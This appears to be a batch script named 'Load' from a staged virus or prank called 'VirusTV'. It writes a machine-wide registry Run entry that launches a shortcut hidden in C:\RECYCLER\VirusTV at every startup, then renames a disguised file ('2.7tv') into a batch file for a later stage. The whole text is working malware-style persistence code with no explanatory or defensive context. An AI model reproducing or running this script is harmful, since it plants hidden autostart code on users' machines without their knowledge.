TITLE Load
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "VirusTV_part_1" /t REG_SZ /d "C:\RECYCLER\VirusTV\Day_2.lnk" /f >nul
rename 2.7tv Day_2.bat
pause